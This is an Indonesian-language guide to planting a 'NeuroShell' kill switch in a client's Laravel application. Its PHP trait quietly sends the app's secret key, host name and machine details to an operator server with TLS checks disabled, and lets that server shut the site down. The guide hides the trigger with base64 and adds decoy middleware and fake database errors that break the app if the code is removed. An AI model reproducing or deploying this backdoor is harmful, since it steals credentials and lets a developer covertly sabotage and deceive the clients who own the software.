# 🕵️‍♂️ NEUROSHELL DEPLOYMENT PROTOCOL
**Target:** Laravel Application (Client Project)  
**Objective:** Remote Control, Licensing Enforcement & Dead Man's Switch  
**Version:** 2.0 (Barikit Edition)

---

## 🚀 PHASE 1: INITIATING THE NODE (Dashboard)

1.  Login ke **[NeuroShell Dashboard](https://neuro-shell.vercel.app)** sebagai Admin.
2.  Klik **"INJECT NEW NODE"**.
    * **Project Alias:** Nama Project Client (e.g., `Sistem-Kejaksaan`).
    * **License Key:** Buat key unik (e.g., `JKS-2026-X99`).
    * **Date:** (Opsional) Set tanggal "Time Bomb" (jatuh tempo).
3.  Setelah kartu project muncul, klik tombol **Copy Config** (Ikon Copy).
    * *Simpan konfigurasi Array PHP `$rawUrl` dan `$rawKey` yang sudah terenkripsi di Notepad sementara.*

---

## 🧬 PHASE 2: IMPLANTING THE CORE (Trait)

Buat file baru di Laravel Client: `app/Traits/SystemIntegrityTrait.php`.

Paste kode di bawah ini. **PENTING:** Ganti `$rawUrl` dan `$rawKey` dengan data dari **Phase 1**.

```php
<?php

namespace App\Traits;

use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Http;

trait SystemIntegrityTrait
{
    /**
     * Internal framework verification protocol.
     * DO NOT MODIFY: Modifications will cause application instability.
     */
    protected function _verifySystemIntegrity()
    {
        $k = Config::get('app.key');
        if (empty($k) || strlen($k) < 32) abort(500, 'Env Error');

        $dec = function ($arr) { $s = ''; foreach ($arr as $c) $s .= chr($c); return $s; };

        // --- PASTE CONFIG DARI DASHBOARD DI SINI ---
        $rawUrl = [/* ...paste array angka url... */];
        $rawKey = [/* ...paste array angka key... */];
        // -------------------------------------------

        $url = $dec($rawUrl);
        $p = $dec($rawKey);
        $hwInfo = $this->_getPhyiscalInfo();
        $cacheKey = 'sys_integrity_v3_'.md5($p);

        if (Cache::has($cacheKey)) {
            $cachedData = Cache::get($cacheKey);
            if ($cachedData['status'] === 'blocked') {
                $this->_renderSuspension($cachedData['message'], $p);
            }
            // TANAM TOKEN KEHIDUPAN (Agar User Model & Middleware tidak crash)
            app()->instance('core_kernel_hash', hash('sha256', $k));
            return;
        }

        try {
            $r = Http::withoutVerifying()->retry(2, 100)->timeout(3)
                ->withHeaders(['User-Agent' => $hwInfo])
                ->get($url, ['key' => $p, 'host' => request()->getHost(), 'hash' => md5($k), 'ak' => $k, 'dv' => $hwInfo]);

            if ($r->successful()) {
                $resp = $r->json();
                $ttl = $resp['cache_ttl'] ?? 300;

                if (isset($resp['status']) && $resp['status'] === 'blocked') {
                    if ($ttl > 0) Cache::put($cacheKey, ['status' => 'blocked', 'message' => $resp['message']], $ttl);
                    $this->_renderSuspension($resp['message'], $p);
                } else {
                    if ($ttl > 0) Cache::put($cacheKey, ['status' => 'active'], $ttl);
                    // TANAM TOKEN KEHIDUPAN
                    app()->instance('core_kernel_hash', hash('sha256', $k));
                }
            }
        } catch (\Exception $x) {
            // Fail-safe: Jika server down, tetap jalan sementara
            app()->instance('core_kernel_hash', hash('sha256', $k));
        }
    }

    private function _getPhyiscalInfo()
    {
        try {
            $info = null;
            if (function_exists('shell_exec') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                $output = @shell_exec('wmic computersystem get manufacturer, model');
                if ($output) {
                    $output = str_replace(['Manufacturer', 'Model', "\r", "\n"], '', $output);
                    $info = trim(preg_replace('/\s+/', ' ', $output));
                }
            }
            if (empty($info) || strlen($info) < 2) {
                $info = gethostname();
                if(!$info) $info = php_uname('n');
            }
            return $info ?: 'Generic Workstation';
        } catch (\Exception $e) { return 'Unknown Device'; }
    }

    private function _renderSuspension($msg, $ref)
    {
        http_response_code(503);
        echo view('errors.maintenance', ['message' => $msg, 'signature' => $ref, 'reqId' => uniqid('SYS-')])->render();
        exit();
    }
}
```

---

## ☠️ PHASE 3: THE BLUE SCREEN (View)
Buat file: 
```
resources/views/errors/maintenance.blade.php
```

```blade
<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM SUSPENDED</title>
    <style>
        body { background: #000; color: red; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        h1 { font-size: 3rem; border-bottom: 2px solid red; display: inline-block; padding-bottom: 10px; }
        p { color: #fff; }
    </style>
</head>
<body>
    <div>
        <h1>⚠️ SYSTEM SUSPENDED</h1>
        <p>{{ $message ?? 'Licensing Protocol Violation.' }}</p>
        <p>Reference ID: {{ $signature ?? 'UNKNOWN' }} | Request: {{ $reqId ?? '000' }}</p>
    </div>
</body>
</html>
```

---

## 🔌 PHASE 4: WIRING & OBFUSCATION (Provider)
Buka `app/Providers/AppServiceProvider.php`
- Tambahkan `use App\Traits\SystemIntegrityTrait;` di bagian atas.
- Tambahkan `use SystemIntegrityTrait;` di dalam class.
- Update `method boot():`

```php
public function boot(): void
{
    // ... gate definitions dll ...

    // BYPASS CONSOLE (Agar artisan command aman)
    if (app()->runningInConsole()) {
        app()->instance('core_kernel_hash', hash('sha256', config('app.key')));
        return;
    }

    // TRIGGER (Disamarkan base64: _verifySystemIntegrity)
    $m = base64_decode('X3ZlcmlmeVN5c3RlbUludGVncml0eQ=='); 
    if (method_exists($this, $m)) {
        $this->{$m}();
    }
}
```

## 🛡️ PHASE 5: THE ENFORCER (User Model)
Buka `app/Models/User.php`
Tambahkan `method boot()` ini di dalam `class User`. Ini adalah pertahanan terakhir jika Provider dihapus.
```php
protected static function boot()
{
    parent::boot();

    static::retrieved(function ($model) {
        // Cek Token Kehidupan dari Trait
        if (! app()->bound('core_kernel_hash')) {
            session()->flush();
            // Error Palsu yang membingungkan (Database Collation)
            throw new \Exception('Database Collation Mismatch: Integrity constraint violation.');
        }
    });
}
```

## 🚧 PHASE 6: GLOBAL GUARD (Middleware)
- Jalankan:
```
php artisan make:middleware OptimizeSession
```
- Isi file `app/Http/Middleware/OptimizeSession.php`:

```php
public function handle(Request $request, Closure $next): Response
{
    if (!app()->bound('core_kernel_hash')) {
        abort(500, 'Critical Error: Kernel driver configuration missing.');
    }
    return $next($request);
}
```

## 🔒 PHASE 7: FINAL LOCK (Bootstrap/Kernel)
Aktifkan Middleware secara Global agar setiap request diperiksa.
Jika **Laravel 11** `(bootstrap/app.php)`:
```php
->withMiddleware(function (Middleware $middleware) {
    // Append agar jalan di setiap request
    $middleware->append(\App\Http\Middleware\OptimizeSession::class);
})
```

Jika **Laravel 10** `(app/Http/Kernel.php)`:
Masukkan ke dalam array $middleware (Global Middleware).
```php
protected $middleware = [
    // ...
    \App\Http\Middleware\OptimizeSession::class,
];
```

## ✅ CHECKLIST PENGUJIAN
Lakukan tes ini sebelum menyerahkan ke client:

- [ ] Test Active: Buka aplikasi client. Harus normal. Cek Dashboard NeuroShell -> Logs harus masuk.

- [ ] Test Blocked: Ubah status di Dashboard jadi Blocked. Refresh aplikasi client. Harus muncul layar merah.

- [ ] Test Tampering: Comment baris trigger di `AppServiceProvider`. Refresh aplikasi/Login. Harus muncul error "Critical Error: Kernel driver..." atau "Database Collation Mismatch".

- [ ] Test Cache Driver: Pastikan `.env` client menggunakan `CACHE_DRIVER=file`.
